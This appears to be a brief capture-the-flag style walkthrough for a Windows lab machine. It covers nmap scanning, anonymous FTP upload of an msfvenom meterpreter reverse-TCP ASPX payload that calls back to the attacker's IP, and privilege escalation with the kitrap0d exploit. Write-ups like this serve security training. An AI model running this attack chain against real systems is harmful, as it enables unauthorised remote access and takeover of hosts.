1.) Reconnaissance
  Nmapping, command is:
    nmap -A -T4 -sV -p- -O --script vuln 10.129.47.129
  Command shows ports 21 and 80 are open, running some windows(server 2008, or 7, or vista, or server 2012)
  ftp is open to default credentials, but none of the files in there are very important
  However, the website is using the directory so we'll upload a malicious file there
2.) Remote Access
  use msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.36 LPORT=4444 -f aspx > devel.aspx
  enter the ftp with username anonymous and hit enter on the password to login
  put devel.aspx in there an open up msfconsole
  use multi/handler and set:
	payload: windows/meterpreter/reverse_tcp
	lhost/lport: LABIP and Port 4444
	ExitOnSession: false
  exploit -j, then navigate to 10.129.47.129/devel.aspx to open the session
  after navigating through the files a bit, doesn't seem like there's anything interesting
  type background to hide the session and use local_exploit_suggester on the open session
  For this one, I used ms10_015_kitrap0d and set the session
  It should open or amend a session with admin perms
ggez
